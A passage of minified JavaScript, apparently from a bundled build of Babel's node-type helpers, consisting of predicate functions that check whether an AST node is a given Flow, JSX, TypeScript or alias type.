Jb(X,J){if(!X)return!1;if(X.type!=="InterfaceDeclaration")return!1;return J==null||I.default(X,J)}function Qb(X,J){if(!X)return!1;if(X.type!=="InterfaceTypeAnnotation")return!1;return J==null||I.default(X,J)}function Yb(X,J){if(!X)return!1;if(X.type!=="IntersectionTypeAnnotation")return!1;return J==null||I.default(X,J)}function Wb(X,J){if(!X)return!1;if(X.type!=="MixedTypeAnnotation")return!1;return J==null||I.default(X,J)}function Gb(X,J){if(!X)return!1;if(X.type!=="EmptyTypeAnnotation")return!1;return J==null||I.default(X,J)}function zb(X,J){if(!X)return!1;if(X.type!=="NullableTypeAnnotation")return!1;return J==null||I.default(X,J)}function Hb(X,J){if(!X)return!1;if(X.type!=="NumberLiteralTypeAnnotation")return!1;return J==null||I.default(X,J)}function Ub(X,J){if(!X)return!1;if(X.type!=="NumberTypeAnnotation")return!1;return J==null||I.default(X,J)}function Kb(X,J){if(!X)return!1;if(X.type!=="ObjectTypeAnnotation")return!1;return J==null||I.default(X,J)}function Vb(X,J){if(!X)return!1;if(X.type!=="ObjectTypeInternalSlot")return!1;return J==null||I.default(X,J)}function Bb(X,J){if(!X)return!1;if(X.type!=="ObjectTypeCallProperty")return!1;return J==null||I.default(X,J)}function qb(X,J){if(!X)return!1;if(X.type!=="ObjectTypeIndexer")return!1;return J==null||I.default(X,J)}function Zb(X,J){if(!X)return!1;if(X.type!=="ObjectTypeProperty")return!1;return J==null||I.default(X,J)}function Mb(X,J){if(!X)return!1;if(X.type!=="ObjectTypeSpreadProperty")return!1;return J==null||I.default(X,J)}function Fb(X,J){if(!X)return!1;if(X.type!=="OpaqueType")return!1;return J==null||I.default(X,J)}function jb(X,J){if(!X)return!1;if(X.type!=="QualifiedTypeIdentifier")return!1;return J==null||I.default(X,J)}function Ob(X,J){if(!X)return!1;if(X.type!=="StringLiteralTypeAnnotation")return!1;return J==null||I.default(X,J)}function Rb(X,J){if(!X)return!1;if(X.type!=="StringTypeAnnotation")return!1;return J==null||I.default(X,J)}function Ab(X,J){if(!X)return!1;if(X.type!=="SymbolTypeAnnotation")return!1;return J==null||I.default(X,J)}function Nb(X,J){if(!X)return!1;if(X.type!=="ThisTypeAnnotation")return!1;return J==null||I.default(X,J)}function Lb(X,J){if(!X)return!1;if(X.type!=="TupleTypeAnnotation")return!1;return J==null||I.default(X,J)}function Db(X,J){if(!X)return!1;if(X.type!=="TypeofTypeAnnotation")return!1;return J==null||I.default(X,J)}function wb(X,J){if(!X)return!1;if(X.type!=="TypeAlias")return!1;return J==null||I.default(X,J)}function Ib(X,J){if(!X)return!1;if(X.type!=="TypeAnnotation")return!1;return J==null||I.default(X,J)}function Cb(X,J){if(!X)return!1;if(X.type!=="TypeCastExpression")return!1;return J==null||I.default(X,J)}function Pb(X,J){if(!X)return!1;if(X.type!=="TypeParameter")return!1;return J==null||I.default(X,J)}function Sb(X,J){if(!X)return!1;if(X.type!=="TypeParameterDeclaration")return!1;return J==null||I.default(X,J)}function Tb(X,J){if(!X)return!1;if(X.type!=="TypeParameterInstantiation")return!1;return J==null||I.default(X,J)}function _b(X,J){if(!X)return!1;if(X.type!=="UnionTypeAnnotation")return!1;return J==null||I.default(X,J)}function Eb(X,J){if(!X)return!1;if(X.type!=="Variance")return!1;return J==null||I.default(X,J)}function $b(X,J){if(!X)return!1;if(X.type!=="VoidTypeAnnotation")return!1;return J==null||I.default(X,J)}function kb(X,J){if(!X)return!1;if(X.type!=="EnumDeclaration")return!1;return J==null||I.default(X,J)}function bb(X,J){if(!X)return!1;if(X.type!=="EnumBooleanBody")return!1;return J==null||I.default(X,J)}function vb(X,J){if(!X)return!1;if(X.type!=="EnumNumberBody")return!1;return J==null||I.default(X,J)}function xb(X,J){if(!X)return!1;if(X.type!=="EnumStringBody")return!1;return J==null||I.default(X,J)}function fb(X,J){if(!X)return!1;if(X.type!=="EnumSymbolBody")return!1;return J==null||I.default(X,J)}function gb(X,J){if(!X)return!1;if(X.type!=="EnumBooleanMember")return!1;return J==null||I.default(X,J)}function hb(X,J){if(!X)return!1;if(X.type!=="EnumNumberMember")return!1;return J==null||I.default(X,J)}function yb(X,J){if(!X)return!1;if(X.type!=="EnumStringMember")return!1;return J==null||I.default(X,J)}function mb(X,J){if(!X)return!1;if(X.type!=="EnumDefaultedMember")return!1;return J==null||I.default(X,J)}function ub(X,J){if(!X)return!1;if(X.type!=="IndexedAccessType")return!1;return J==null||I.default(X,J)}function cb(X,J){if(!X)return!1;if(X.type!=="OptionalIndexedAccessType")return!1;return J==null||I.default(X,J)}function lb(X,J){if(!X)return!1;if(X.type!=="JSXAttribute")return!1;return J==null||I.default(X,J)}function pb(X,J){if(!X)return!1;if(X.type!=="JSXClosingElement")return!1;return J==null||I.default(X,J)}function db(X,J){if(!X)return!1;if(X.type!=="JSXElement")return!1;return J==null||I.default(X,J)}function ib(X,J){if(!X)return!1;if(X.type!=="JSXEmptyExpression")return!1;return J==null||I.default(X,J)}function rb(X,J){if(!X)return!1;if(X.type!=="JSXExpressionContainer")return!1;return J==null||I.default(X,J)}function nb(X,J){if(!X)return!1;if(X.type!=="JSXSpreadChild")return!1;return J==null||I.default(X,J)}function ab(X,J){if(!X)return!1;if(X.type!=="JSXIdentifier")return!1;return J==null||I.default(X,J)}function sb(X,J){if(!X)return!1;if(X.type!=="JSXMemberExpression")return!1;return J==null||I.default(X,J)}function ob(X,J){if(!X)return!1;if(X.type!=="JSXNamespacedName")return!1;return J==null||I.default(X,J)}function tb(X,J){if(!X)return!1;if(X.type!=="JSXOpeningElement")return!1;return J==null||I.default(X,J)}function eb(X,J){if(!X)return!1;if(X.type!=="JSXSpreadAttribute")return!1;return J==null||I.default(X,J)}function Xv(X,J){if(!X)return!1;if(X.type!=="JSXText")return!1;return J==null||I.default(X,J)}function Jv(X,J){if(!X)return!1;if(X.type!=="JSXFragment")return!1;return J==null||I.default(X,J)}function Qv(X,J){if(!X)return!1;if(X.type!=="JSXOpeningFragment")return!1;return J==null||I.default(X,J)}function Yv(X,J){if(!X)return!1;if(X.type!=="JSXClosingFragment")return!1;return J==null||I.default(X,J)}function Wv(X,J){if(!X)return!1;if(X.type!=="Noop")return!1;return J==null||I.default(X,J)}function Gv(X,J){if(!X)return!1;if(X.type!=="Placeholder")return!1;return J==null||I.default(X,J)}function zv(X,J){if(!X)return!1;if(X.type!=="V8IntrinsicIdentifier")return!1;return J==null||I.default(X,J)}function Hv(X,J){if(!X)return!1;if(X.type!=="ArgumentPlaceholder")return!1;return J==null||I.default(X,J)}function Uv(X,J){if(!X)return!1;if(X.type!=="BindExpression")return!1;return J==null||I.default(X,J)}function Kv(X,J){if(!X)return!1;if(X.type!=="Decorator")return!1;return J==null||I.default(X,J)}function Vv(X,J){if(!X)return!1;if(X.type!=="DoExpression")return!1;return J==null||I.default(X,J)}function Bv(X,J){if(!X)return!1;if(X.type!=="ExportDefaultSpecifier")return!1;return J==null||I.default(X,J)}function qv(X,J){if(!X)return!1;if(X.type!=="RecordExpression")return!1;return J==null||I.default(X,J)}function Zv(X,J){if(!X)return!1;if(X.type!=="TupleExpression")return!1;return J==null||I.default(X,J)}function Mv(X,J){if(!X)return!1;if(X.type!=="DecimalLiteral")return!1;return J==null||I.default(X,J)}function Fv(X,J){if(!X)return!1;if(X.type!=="ModuleExpression")return!1;return J==null||I.default(X,J)}function jv(X,J){if(!X)return!1;if(X.type!=="TopicReference")return!1;return J==null||I.default(X,J)}function Ov(X,J){if(!X)return!1;if(X.type!=="PipelineTopicExpression")return!1;return J==null||I.default(X,J)}function Rv(X,J){if(!X)return!1;if(X.type!=="PipelineBareFunction")return!1;return J==null||I.default(X,J)}function Av(X,J){if(!X)return!1;if(X.type!=="PipelinePrimaryTopicReference")return!1;return J==null||I.default(X,J)}function Nv(X,J){if(!X)return!1;if(X.type!=="VoidPattern")return!1;return J==null||I.default(X,J)}function Lv(X,J){if(!X)return!1;if(X.type!=="TSParameterProperty")return!1;return J==null||I.default(X,J)}function Dv(X,J){if(!X)return!1;if(X.type!=="TSDeclareFunction")return!1;return J==null||I.default(X,J)}function wv(X,J){if(!X)return!1;if(X.type!=="TSDeclareMethod")return!1;return J==null||I.default(X,J)}function Iv(X,J){if(!X)return!1;if(X.type!=="TSQualifiedName")return!1;return J==null||I.default(X,J)}function Cv(X,J){if(!X)return!1;if(X.type!=="TSCallSignatureDeclaration")return!1;return J==null||I.default(X,J)}function Pv(X,J){if(!X)return!1;if(X.type!=="TSConstructSignatureDeclaration")return!1;return J==null||I.default(X,J)}function Sv(X,J){if(!X)return!1;if(X.type!=="TSPropertySignature")return!1;return J==null||I.default(X,J)}function Tv(X,J){if(!X)return!1;if(X.type!=="TSMethodSignature")return!1;return J==null||I.default(X,J)}function _v(X,J){if(!X)return!1;if(X.type!=="TSIndexSignature")return!1;return J==null||I.default(X,J)}function Ev(X,J){if(!X)return!1;if(X.type!=="TSAnyKeyword")return!1;return J==null||I.default(X,J)}function $v(X,J){if(!X)return!1;if(X.type!=="TSBooleanKeyword")return!1;return J==null||I.default(X,J)}function kv(X,J){if(!X)return!1;if(X.type!=="TSBigIntKeyword")return!1;return J==null||I.default(X,J)}function bv(X,J){if(!X)return!1;if(X.type!=="TSIntrinsicKeyword")return!1;return J==null||I.default(X,J)}function vv(X,J){if(!X)return!1;if(X.type!=="TSNeverKeyword")return!1;return J==null||I.default(X,J)}function xv(X,J){if(!X)return!1;if(X.type!=="TSNullKeyword")return!1;return J==null||I.default(X,J)}function fv(X,J){if(!X)return!1;if(X.type!=="TSNumberKeyword")return!1;return J==null||I.default(X,J)}function gv(X,J){if(!X)return!1;if(X.type!=="TSObjectKeyword")return!1;return J==null||I.default(X,J)}function hv(X,J){if(!X)return!1;if(X.type!=="TSStringKeyword")return!1;return J==null||I.default(X,J)}function yv(X,J){if(!X)return!1;if(X.type!=="TSSymbolKeyword")return!1;return J==null||I.default(X,J)}function mv(X,J){if(!X)return!1;if(X.type!=="TSUndefinedKeyword")return!1;return J==null||I.default(X,J)}function uv(X,J){if(!X)return!1;if(X.type!=="TSUnknownKeyword")return!1;return J==null||I.default(X,J)}function cv(X,J){if(!X)return!1;if(X.type!=="TSVoidKeyword")return!1;return J==null||I.default(X,J)}function lv(X,J){if(!X)return!1;if(X.type!=="TSThisType")return!1;return J==null||I.default(X,J)}function pv(X,J){if(!X)return!1;if(X.type!=="TSFunctionType")return!1;return J==null||I.default(X,J)}function dv(X,J){if(!X)return!1;if(X.type!=="TSConstructorType")return!1;return J==null||I.default(X,J)}function iv(X,J){if(!X)return!1;if(X.type!=="TSTypeReference")return!1;return J==null||I.default(X,J)}function rv(X,J){if(!X)return!1;if(X.type!=="TSTypePredicate")return!1;return J==null||I.default(X,J)}function nv(X,J){if(!X)return!1;if(X.type!=="TSTypeQuery")return!1;return J==null||I.default(X,J)}function av(X,J){if(!X)return!1;if(X.type!=="TSTypeLiteral")return!1;return J==null||I.default(X,J)}function sv(X,J){if(!X)return!1;if(X.type!=="TSArrayType")return!1;return J==null||I.default(X,J)}function ov(X,J){if(!X)return!1;if(X.type!=="TSTupleType")return!1;return J==null||I.default(X,J)}function tv(X,J){if(!X)return!1;if(X.type!=="TSOptionalType")return!1;return J==null||I.default(X,J)}function ev(X,J){if(!X)return!1;if(X.type!=="TSRestType")return!1;return J==null||I.default(X,J)}function Xx(X,J){if(!X)return!1;if(X.type!=="TSNamedTupleMember")return!1;return J==null||I.default(X,J)}function Jx(X,J){if(!X)return!1;if(X.type!=="TSUnionType")return!1;return J==null||I.default(X,J)}function Qx(X,J){if(!X)return!1;if(X.type!=="TSIntersectionType")return!1;return J==null||I.default(X,J)}function Yx(X,J){if(!X)return!1;if(X.type!=="TSConditionalType")return!1;return J==null||I.default(X,J)}function Wx(X,J){if(!X)return!1;if(X.type!=="TSInferType")return!1;return J==null||I.default(X,J)}function Gx(X,J){if(!X)return!1;if(X.type!=="TSParenthesizedType")return!1;return J==null||I.default(X,J)}function zx(X,J){if(!X)return!1;if(X.type!=="TSTypeOperator")return!1;return J==null||I.default(X,J)}function Hx(X,J){if(!X)return!1;if(X.type!=="TSIndexedAccessType")return!1;return J==null||I.default(X,J)}function Ux(X,J){if(!X)return!1;if(X.type!=="TSMappedType")return!1;return J==null||I.default(X,J)}function Kx(X,J){if(!X)return!1;if(X.type!=="TSTemplateLiteralType")return!1;return J==null||I.default(X,J)}function Vx(X,J){if(!X)return!1;if(X.type!=="TSLiteralType")return!1;return J==null||I.default(X,J)}function Bx(X,J){if(!X)return!1;if(X.type!=="TSExpressionWithTypeArguments")return!1;return J==null||I.default(X,J)}function qx(X,J){if(!X)return!1;if(X.type!=="TSInterfaceDeclaration")return!1;return J==null||I.default(X,J)}function Zx(X,J){if(!X)return!1;if(X.type!=="TSInterfaceBody")return!1;return J==null||I.default(X,J)}function Mx(X,J){if(!X)return!1;if(X.type!=="TSTypeAliasDeclaration")return!1;return J==null||I.default(X,J)}function Fx(X,J){if(!X)return!1;if(X.type!=="TSInstantiationExpression")return!1;return J==null||I.default(X,J)}function jx(X,J){if(!X)return!1;if(X.type!=="TSAsExpression")return!1;return J==null||I.default(X,J)}function Ox(X,J){if(!X)return!1;if(X.type!=="TSSatisfiesExpression")return!1;return J==null||I.default(X,J)}function Rx(X,J){if(!X)return!1;if(X.type!=="TSTypeAssertion")return!1;return J==null||I.default(X,J)}function Ax(X,J){if(!X)return!1;if(X.type!=="TSEnumBody")return!1;return J==null||I.default(X,J)}function Nx(X,J){if(!X)return!1;if(X.type!=="TSEnumDeclaration")return!1;return J==null||I.default(X,J)}function Lx(X,J){if(!X)return!1;if(X.type!=="TSEnumMember")return!1;return J==null||I.default(X,J)}function Dx(X,J){if(!X)return!1;if(X.type!=="TSModuleDeclaration")return!1;return J==null||I.default(X,J)}function wx(X,J){if(!X)return!1;if(X.type!=="TSModuleBlock")return!1;return J==null||I.default(X,J)}function Ix(X,J){if(!X)return!1;if(X.type!=="TSImportType")return!1;return J==null||I.default(X,J)}function Cx(X,J){if(!X)return!1;if(X.type!=="TSImportEqualsDeclaration")return!1;return J==null||I.default(X,J)}function Px(X,J){if(!X)return!1;if(X.type!=="TSExternalModuleReference")return!1;return J==null||I.default(X,J)}function Sx(X,J){if(!X)return!1;if(X.type!=="TSNonNullExpression")return!1;return J==null||I.default(X,J)}function Tx(X,J){if(!X)return!1;if(X.type!=="TSExportAssignment")return!1;return J==null||I.default(X,J)}function _x(X,J){if(!X)return!1;if(X.type!=="TSNamespaceExportDeclaration")return!1;return J==null||I.default(X,J)}function Ex(X,J){if(!X)return!1;if(X.type!=="TSTypeAnnotation")return!1;return J==null||I.default(X,J)}function $x(X,J){if(!X)return!1;if(X.type!=="TSTypeParameterInstantiation")return!1;return J==null||I.default(X,J)}function kx(X,J){if(!X)return!1;if(X.type!=="TSTypeParameterDeclaration")return!1;return J==null||I.default(X,J)}function bx(X,J){if(!X)return!1;if(X.type!=="TSTypeParameter")return!1;return J==null||I.default(X,J)}function vx(X,J){if(!X)return!1;switch(X.type){case"ArrayExpression":case"AssignmentExpression":case"BinaryExpression":case"InterpreterDirective":case"Directive":case"DirectiveLiteral":case"BlockStatement":case"BreakStatement":case"CallExpression":case"CatchClause":case"ConditionalExpression":case"ContinueStatement":case"DebuggerStatement":case"DoWhileStatement":case"EmptyStatement":case"ExpressionStatement":case"File":case"ForInStatement":case"ForStatement":case"FunctionDeclaration":case"FunctionExpression":case"Identifier":case"IfStatement":case"LabeledStatement":case"StringLiteral":case"NumericLiteral":case"NullLiteral":case"BooleanLiteral":case"RegExpLiteral":case"LogicalExpression":case"MemberExpression":case"NewExpression":case"Program":case"ObjectExpression":case"ObjectMethod":case"ObjectProperty":case"RestElement":case"ReturnStatement":case"SequenceExpression":case"ParenthesizedExpression":case"SwitchCase":case"SwitchStatement":case"ThisExpression":case"ThrowStatement":case"TryStatement":case"UnaryExpression":case"UpdateExpression":case"VariableDeclaration":case"VariableDeclarator":case"WhileStatement":case"WithStatement":case"AssignmentPattern":case"ArrayPattern":case"ArrowFunctionExpression":case"ClassBody":case"ClassExpression":case"ClassDeclaration":case"ExportAllDeclaration":case"ExportDefaultDeclaration":case"ExportNamedDeclaration":case"ExportSpecifier":case"ForOfStatement":case"ImportDeclaration":case"ImportDefaultSpecifier":case"ImportNamespaceSpecifier":case"ImportSpecifier":case"ImportExpression":case"MetaProperty":case"ClassMethod":case"ObjectPattern":case"SpreadElement":case"Super":case"TaggedTemplateExpression":case"TemplateElement":case"TemplateLiteral":case"YieldExpression":case"AwaitExpression":case"Import":case"BigIntLiteral":case"ExportNamespaceSpecifier":case"OptionalMemberExpression":case"OptionalCallExpression":case"ClassProperty":case"ClassAccessorProperty":case"ClassPrivateProperty":case"ClassPrivateMethod":case"PrivateName":case"StaticBlock":case"ImportAttribute":break;case"Placeholder":switch(X.expectedNode){case"Identifier":case"StringLiteral":case"BlockStatement":case"ClassBody":break;default:return!1}break;default:return!1}return J==null||I.default(X,J)}function xx(X,J){if(!X)return!1;switch(X.type){case"ArrayExpression":case"AssignmentExpression":case"BinaryExpression":case"CallExpression":case"ConditionalExpression":case"FunctionExpression":case"Identifier":case"StringLiteral":case"NumericLiteral":case"NullLiteral":case"BooleanLiteral":case"RegExpLiteral":case"LogicalExpression":case"MemberExpression":case"NewExpression":case"ObjectExpression":case"SequenceExpression":case"ParenthesizedExpression":case"ThisExpression":case"UnaryExpression":case"UpdateExpression":case"ArrowFunctionExpression":case"ClassExpression":case"ImportExpression":case"MetaProperty":case"Super":case"TaggedTemplateExpression":case"TemplateLiteral":case"YieldExpression":case"AwaitExpression":case"Import":case"BigIntLiteral":case"OptionalMemberExpression":case"OptionalCallExpression":case"TypeCastExpression":case"JSXElement":case"JSXFragment":case"BindExpression":case"DoExpression":case"RecordExpression":case"TupleExpression":case"DecimalLiteral":case"ModuleExpression":case"TopicReference":case"PipelineTopicExpression":case"PipelineBareFunction":case"PipelinePrimaryTopicReference":case"TSInstantiationExpression":case"TSAsExpression":case"TSSatisfiesExpression":case"TSTypeAssertion":case"TSNonNullExpression":break;case"Placeholder":switch(X.expectedNode){case"Expression":case"Identifier":case"StringLiteral":break;default:return!1}break;default:return!1}return J==null||I.default(X,J)}function fx(X,J){if(!X)return!1;switch(X.type){case"BinaryExpression":case"LogicalExpression":break;default:return!1}return J==null||I.default(X,J)}function gx(X,J){if(!X)return!1;switch(X.type){case"BlockStatement":case"CatchClause":case"DoWhileStatement":case"ForInStatement":case"ForStatement":case"FunctionDeclaration":case"FunctionExpression":case"Program":case"ObjectMethod":case"SwitchStatement":case"WhileStatement":case"ArrowFunctionExpression":case"ClassExpression":case"ClassDeclaration":case"ForOfStatement":case"ClassMethod":case"ClassPrivateMethod":case"StaticBlock":case"TSModuleBlock":break;case"Placeholder":if(X.expectedNode==="BlockStatement")break;default:return!1}return J==null||I.default(X,J)}function hx(X,J){if(!X)return!1;switch(X.type){case"BlockStatement":case"CatchClause":case"DoWhileStatement":case"ForInStatement":case"ForStatement":case"FunctionDeclaration":case"FunctionExpression":case"Program":case"ObjectMethod":case"SwitchStatement":case"WhileStatement":case"ArrowFunctionExpression":case"ForOfStatement":case"ClassMethod":case"ClassPrivateMethod":case"StaticBlock":case"TSModuleBlock":break;case"Placeholder":if(X.expectedNode==="BlockStatement")break;default:return!1}return J==null||I.default(X,J)}function yx(X,J){if(!X)return!1;switch(X.type){case"BlockStatement":case"Program":case"TSModuleBlock":break;case"Placeholder":if(X.expectedNode==="BlockStatement")break;default:return!1}return J==null||I.default(X,J)}function mx(X,J){if(!X)return!1;switch(X.type){case"BlockStatement":case"BreakStatement":case"ContinueStatement":case"DebuggerStatement":case"DoWhileStatement":case"EmptyStatement":case"ExpressionStatement":case"ForInStatement":case"ForStatement":case"FunctionDeclaration":case"IfStatement":case"LabeledStatement":case"ReturnStatement":case"SwitchStatement":case"ThrowStatement":case"TryStatement":case"VariableDeclaration":case"WhileStatement":case"WithStatement":case"ClassDeclaration":case"ExportAllDeclaration":case"ExportDefaultDeclaration":case"ExportNamedDeclaration":case"ForOfStatement":case"ImportDeclaration":case"DeclareClass":case"DeclareFunction":case"DeclareInterface":case"DeclareModule":case"DeclareModuleExports":case"DeclareTypeAlias":case"DeclareOpaqueType":case"DeclareVariable":case"DeclareExportDeclaration":case"DeclareExportAllDeclaration":case"InterfaceDeclaration":case"OpaqueType":case"TypeAlias":case"EnumDeclaration":case"TSDeclareFunction":case"TSInterfaceDeclaration":case"TSTypeAliasDeclaration":case"TSEnumDeclaration":case"TSModuleDeclaration":case"TSImportEqualsDeclaration":case"TSExportAssignment":case"TSNamespaceExportDeclaration":break;case"Placeholder":switch(X.expectedNode){case"Statement":case"Declaration":case"BlockStatement":break;default:return!1}break;default:return!1}return J==null||I.default(X,J)}function ux(X,J){if(!X)return!1;switch(X.type){case"BreakStatement":case"ContinueStatement":case"ReturnStatement":case"ThrowStatement":case"YieldExpression":case"AwaitExpression":break;default:return!1}return J==null||I.default(X,J)}function cx(X,J){if(!X)return!1;switch(X.type){case"BreakStatement":case"ContinueStatement":case"ReturnStatement":case"ThrowStatement":break;default:return!1}return J==null||I.default(X,J)}function lx(X,J){if(!X)return!1;switch(X.type){case"ConditionalExpression":case"IfStatement":break;default:return!1}return J==null||I.default(X,J)}function px(X,J){if(!X)return!1;switch(X.type){case"DoWhileStatement":case"ForInStatement":case"ForStatement":case"WhileStatement":case"ForOfStatement":break;default:return!1}return J==null||I.default(X,J)}function dx(X,J){if(!X)return!1;switch(X.type){case"DoWhileStatement":case"WhileStatement":break;default:return!1}return J==null||I.default(X,J)}function ix(X,J){if(!X)return!1;switch(X.type){case"ExpressionStatement":case"ParenthesizedExpression":case"TypeCastExpression":break;default:return!1}return J==null||I.default(X,J)}function rx(X,J){if(!X)return!1;switch(X.type){case"ForInStatement":case"ForStatement":case"ForOfStatement":break;default:return!1}return J==null||I.default(X,J)}function nx(X,J){if(!X)return!1;switch(X.type){case"ForInStatement":case"ForOfStatement":break;default:return!1}return J==null||I.default(X,J)}function ax(X,J){if(!X)return!1;switch(X.type){case"FunctionDeclaration":case"FunctionExpression":case"ObjectMethod":case"ArrowFunctionExpression":case"ClassMethod":case"ClassPrivateMethod":break;default:return!1}return J==null||I.default(X,J)}function sx(X,J){if(!X)return!1;switch(X.type){case"FunctionDeclaration":case"FunctionExpression":case"ObjectMethod":case"ArrowFunctionExpression":case"ClassMethod":case"ClassPrivateMethod":case"StaticBlock":case"TSModuleBlock":break;default:return!1}return J==null||I.default(X,J)}function ox(X,J){if(!X)return!1;switch(X.type){case"FunctionDeclaration":case"FunctionExpression":case"StringLiteral":case"NumericLiteral":case"NullLiteral":case"BooleanLiteral":case"RegExpLiteral":case"ArrowFunctionExpression":case"BigIntLiteral":case"DecimalLiteral":break;case"Placeholder":if(X.expectedNode==="StringLiteral")break;default:return!1}return J==null||I.default(X,J)}function tx(X,J){if(!X)return!1;switch(X.type){case"FunctionDeclaration":case"VariableDeclaration":case"ClassDeclaration":case"ExportAllDeclaration":case"ExportDefaultDeclaration":case"ExportNamedDeclaration":case"ImportDeclaration":case"DeclareClass":case"DeclareFunction":case"DeclareInterface":case"DeclareModule":case"DeclareModuleExports":case"DeclareTypeAlias":case"DeclareOpaqueType":case"DeclareVariable":case"DeclareExportDeclaration":case"DeclareExportAllDeclaration":case"InterfaceDeclaration":case"OpaqueType":case"TypeAlias":case"EnumDeclaration":case"TSDeclareFunction":case"TSInterfaceDeclaration":case"TSTypeAliasDeclaration":case"TSEnumDeclaration":case"TSModuleDeclaration":case"TSImportEqualsDeclaration":break;case"Placeholder":if(X.expectedNode==="Declaration")break;default:return!1}return J==null||I.default(X,J)}function ex(X,J){if(!X)return!1;switch(X.type){case"Identifier":case"RestElement":case"AssignmentPattern":case"ArrayPattern":case"ObjectPattern":case"VoidPattern":break;case"Placeholder":if(X.expectedNode==="Identifier")break;default:return!1}return J==null||I.default(X,J)}function Xf(X,J){if(!X)return!1;switch(X.type){case"Identifier":case"MemberExpression":case"RestElement":case"AssignmentPattern":case"ArrayPattern":case"ObjectPattern":case"VoidPattern":case"TSAsExpression":case"TSSatisfiesExpression":case"TSTypeAssertion":case"TSNonNullExpression":break;case"Placeholder":switch(X.expectedNode){case"Pattern":case"Identifier":break;default:return!1}break;default:return!1}return J==null||I.default(X,J)}function Jf(X,J){if(!X)return!1;switch(X.type){case"Identifier":case"MemberExpression":case"RestElement":case"AssignmentPattern":case"ArrayPattern":case"ObjectPattern":case"TSParameterProperty":case"TSAsExpression":case"TSSatisfiesExpression":case"TSTypeAssertion":case"TSNonNullExpression":break;case"Placeholder":switch(X.expectedNode){case"Pattern":case"Identifier":break;default:return!1}break;default:return!1}return J==null||I.default(X,J)}function Qf(X,J){if(!X)return!1;switch(X.type){case"Identifier":case"TSQualifiedName":break;case"Placeholder":if(X.expectedNode==="Identifier")break;default:return!1}return J==null||I.default(X,J)}function Yf(X,J){if(!X)return!1;switch(X.type){case"StringLiteral":case"NumericLiteral":case"NullLiteral":case"BooleanLiteral":case"RegExpLiteral":case"TemplateLiteral":case"BigIntLiteral":case"DecimalLiteral":break;case"Placeholder":if(X.expectedNode==="StringLiteral")break;default:return!1}return J==null||I.default(X,J)}function Wf(X,J){if(!X)return!1;switch(X.type){case"StringLiteral":case"NumericLiteral":case"NullLiteral":case"BooleanLiteral":case"BigIntLiteral":case"JSXAttribute":case"JSXClosingElement":case"JSXElement":case"JSXExpressionContainer":case"JSXSpreadChild":case"JSXOpeningElement":case"JSXText":case"JSXFragment":case"JSXOpeningFragment":case"JSXClosingFragment":case"DecimalLiteral":break;case"Placeholder":if(X.expectedNode==="StringLiteral")break;default:return!1}return J==null||I.default(X,J)}function Gf(X,J){if(!X)return!1;switch(X.type){case"ObjectMethod":case"ObjectProperty":case"ObjectTypeInternalSlot":case"ObjectTypeCallProperty":case"ObjectTypeIndexer":case"ObjectTypeProperty":case"ObjectTypeSpreadProperty":break;default:return!1}return J==null||I.default(X,J)}function zf(X,J){if(!X)return!1;switch(X.type){case"ObjectMethod":case"ClassMethod":case"ClassPrivateMethod":break;default:return!1}return J==null||I.default(X,J)}function Hf(X,J){if(!X)return!1;switch(X.type){case"ObjectMethod":case"ObjectProperty":break;default:return!1}return J==null||I.default(X,J)}function Uf(X,J){if(!X)return!1;switch(X.type){case"ObjectProperty":case"ClassProperty":case"ClassAccessorProperty":case"ClassPrivateProperty":break;default:return!1}return J==null||I.default(X,J)}function Kf(X,J){if(!X)return!1;switch(X.type){case"UnaryExpression":case"SpreadElement":break;default:return!1}return J==null||I.default(X,J)}function Vf(X,J){if(!X)return!1;switch(X.type){case"AssignmentPattern":case"ArrayPattern":case"ObjectPattern":case"VoidPattern":break;case"Placeholder":if(X.expectedNode==="Pattern")break;default:return!1}return J==null||I.default(X,J)}function Bf(X,J){if(!X)return!1;switch(X.type){case"ClassExpression":case"ClassDeclaration":break;default:return!1}return J==null||I.default(X,J)}function uV(X,J){if(!X)return!1;switch(X.type){case"ExportAllDeclaration":case"ExportDefaultDeclaration":case"ExportNamedDeclaration":case"ImportDeclaration":break;default:return!1}return J==null||I.default(X,J)}function qf(X,J){if(!X)return!1;switch(X.type){case"ExportAllDeclaration":case"ExportDefaultDeclaration":case"ExportNamedDeclaration":break;default:return!1}return J==null||I.default(X,J)}function Zf(X,J){if(!X)return!1;switch(X.type){case"ExportSpecifier":case"ImportDefaultSpecifier":case"ImportNamespaceSpecifier":case"ImportSpecifier":case"ExportNamespaceSpecifier":case"ExportDefaultSpecifier":break;default:return!1}return J==null||I.default(X,J)}function Mf(X,J){if(!X)return!1;switch(X.type){case"ClassAccessorProperty":break;default:return!1}return J==null||I.default(X,J)}function Ff(X,J){if(!X)return!1;switch(X.type){case"ClassPrivateProperty":case"ClassPrivateMethod":case"PrivateName":break;default:return!1}return J==null||I.default(X,J)}function jf(X,J){if(!X)return!1;switch(X.type){case"AnyTypeAnnotation":case"ArrayTypeAnnotation":case"BooleanTypeAnnotation":case"BooleanLiteralTypeAnnotation":case"NullLiteralTypeAnnotation":case"ClassImplements":case"DeclareClass":case"DeclareFunction":case"DeclareInterface":case"DeclareModule":case"DeclareModuleExports":case"DeclareTypeAlias":case"DeclareOpaqueType":case"DeclareVariable":case"DeclareExportDeclaration":case"DeclareExportAllDeclaration":case"DeclaredPredicate":case"ExistsTypeAnnotation":case"FunctionTypeAnnotation":case"FunctionTypeParam":case"GenericTypeAnnotation":case"InferredPredicate":case"InterfaceExtends":case"InterfaceDeclaration":case"InterfaceTypeAnnotation":case"IntersectionTypeAnnotation":case"MixedTypeAnnotation":case"EmptyTypeAnnotation":case"NullableTypeAnnotation":case"NumberLiteralTypeAnnotation":case"NumberTypeAnnotation":case"ObjectTypeAnnotation":case"ObjectTypeInternalSlot":case"ObjectTypeCallProperty":case"ObjectTypeIndexer":case"ObjectTypeProperty":case"ObjectTypeSpreadProperty":case"OpaqueType":case"QualifiedTypeIdentifier":case"StringLiteralTypeAnnotation":case"StringTypeAnnotation":case"SymbolTypeAnnotation":case"ThisTypeAnnotation":case"TupleTypeAnnotation":case"TypeofTypeAnnotation":case"TypeAlias":case"TypeAnnotation":case"TypeCastExpression":case"TypeParameter":case"TypeParameterDeclaration":case"TypeParameterInstantiation":case"UnionTypeAnnotation":case"Variance":case"VoidTypeAnnotation":case"EnumDeclaration":case"EnumBooleanBody":case"EnumNumberBody":case"EnumStringBody":case"EnumSymbolBody":case"EnumBooleanMember":case"EnumNumberMember":case"EnumStringMember":case"EnumDefaultedMember":case"IndexedAccessType":case"OptionalIndexedAccessType":break;default:return!1}return J==null||I.default(X,J)}function 